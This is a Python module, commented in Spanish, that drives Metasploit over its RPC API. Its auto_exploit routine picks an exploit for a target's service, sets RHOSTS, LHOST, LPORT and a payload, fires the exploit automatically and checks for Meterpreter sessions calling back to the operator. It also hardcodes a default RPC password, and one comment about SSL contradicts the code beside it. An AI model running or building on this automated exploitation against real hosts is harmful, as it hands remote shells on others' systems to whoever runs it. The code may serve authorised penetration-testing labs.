import os
import time
from pymetasploit3.msfrpc import MsfRpcClient
from core.msf.mapping import get_exploit_config
from dotenv import load_dotenv

load_dotenv()


class MsfCommander:
    """
    Controlador RPC para Metasploit.
    Se conecta al servicio 'berebrum-force' (o localhost) vía API (Puerto 55553).
    """

    def __init__(self):
        self.client = None
        self.cid = None  # ID de la consola virtual
        self.host = os.getenv(
            "MSF_HOST", "127.0.0.1"
        )  # Usa 'berebrum-force' en Docker, '127.0.0.1' en Local
        self.password = os.getenv("MSF_PASSWORD", "berebrum")
        self.port = 55553

    def connect(self):
        """
        Establece conexión con el RPC de Metasploit.
        """
        print(f"    🔌 Conectando a Metasploit RPC en {self.host}:{self.port}...")
        try:
            # ssl=True es necesario porque msfrpcd usa SSL por defecto
            self.client = MsfRpcClient(
                self.password, port=self.port, host=self.host, ssl=False
            )

            # Creamos una consola virtual para interactuar
            # Esto es como abrir una ventana de terminal remota
            self.cid = self.client.consoles.console().cid
            return True
        except Exception as e:
            print(f"    ❌ Error de conexión RPC: {e}")
            print(
                "       (Asegúrate de que el contenedor 'berebrum-force' esté arriba y la password en .env sea correcta)"
            )
            return False

    def get_version(self):
        """
        Obtiene la versión real desde el core de MSF.
        """
        if not self.client:
            return {"version": "Unknown"}
        return self.client.core.version

    def search_module(self, term):
        """
        Busca módulos usando la API de MSF.
        """
        print(f"    ⏳ Buscando '{term}' en la base de datos remota...")
        try:
            # La búsqueda RPC retorna un diccionario
            res = self.client.modules.search(term)
            modules = []
            for m in res:
                # Estructura del resultado: {'fullname': 'exploit/windows/...', ...}
                if "exploit" in m["type"]:
                    modules.append(
                        {"type": m["type"], "name": m["fullname"], "rank": m["rank"]}
                    )
            return modules
        except Exception as e:
            print(f"Error buscando: {e}")
            return []

    def send_command(self, command):
        """
        Envía un comando a la consola virtual y espera la respuesta.
        """
        if not self.client:
            return "No hay conexión."

        # 1. Escribir comando
        self.client.consoles.console(self.cid).write(command)

        # 2. Leer respuesta (Polling)
        time.sleep(1)  # Espera técnica para que MSF procese
        output = ""
        timeout = 5
        start = time.time()

        while time.time() - start < timeout:
            res = self.client.consoles.console(self.cid).read()
            data = res.get("data", "")
            output += data
            if data and not res.get("busy"):
                break
            time.sleep(0.5)

        return output

    def auto_exploit(self, target_ip, service, port):
        """
        Lógica Neuro-Link vía RPC.
        Configura y lanza el exploit automáticamente.
        """
        print(f"    [Neuro-Link] Analizando vector para {service}:{port}...")

        # 1. Consultar Mapping
        exploit_cfg = get_exploit_config(service, service)

        # Fallback para Windows
        if not exploit_cfg and "microsoft-ds" in service:
            exploit_cfg = get_exploit_config("microsoft-ds", "Windows 7")

        if exploit_cfg:
            module_name = exploit_cfg["module"]
            payload = exploit_cfg["payload_compatible"][0]
            print(f"    [!] VULNERABILIDAD CRÍTICA: {module_name}")

            # Preparar configuración
            lhost = (
                "172.18.0.1"  # IP del Gateway Docker o tu IP VPN (Ajustar según red)
            )
            # Intento de autodetectar IP local si estamos en host
            if self.host == "127.0.0.1":
                import socket

                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                try:
                    s.connect(("10.255.255.255", 1))
                    lhost = s.getsockname()[0]
                except:
                    lhost = "127.0.0.1"
                finally:
                    s.close()

            lport = int(port) + 1234

            commands = [
                f"use {module_name}",
                f"set RHOSTS {target_ip}",
                f"set LPORT {lport}",
                f"set LHOST {lhost}",  # Importante: LHOST debe ser alcanzable desde el contenedor Force
                f"set PAYLOAD {payload}",
                "set WfsDelay 10",
                "exploit -z",
            ]

            print(f"    [*] Configurando exploit en consola remota ID {self.cid}...")
            full_cmd = "\n".join(commands) + "\n"

            # Ejecutar secuencia
            output = self.send_command(full_cmd)

            # Análisis básico de éxito en el texto retornado
            if "Session" in output or "Meterpreter" in output or "WIN" in output:
                print(f"    [$$$] ¡POSIBLE ÉXITO! Revisa las sesiones en Metasploit.")
            else:
                print("    [*] Ataque enviado. Verifica logs.")
                # print(output) # Descomentar para debug

        else:
            print(f"    [-] No hay exploit mapeado para {service}")
